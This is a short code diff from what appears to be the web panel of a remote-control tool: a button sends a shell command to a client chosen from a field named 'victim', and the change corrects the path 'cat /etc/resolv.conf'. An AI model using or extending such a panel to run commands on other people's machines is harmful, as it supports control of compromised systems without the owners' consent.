@@ -93,7 +93,7 @@
       });
 
     $("#resolvview").on('click', function() { 
-          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'cat /etc/resol.conf' }, function (data) {
+          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'cat /etc/resolv.conf' }, function (data) {
               
                 $("#lg-op-body").html(data);
                 $("#lg-op").modal('show');
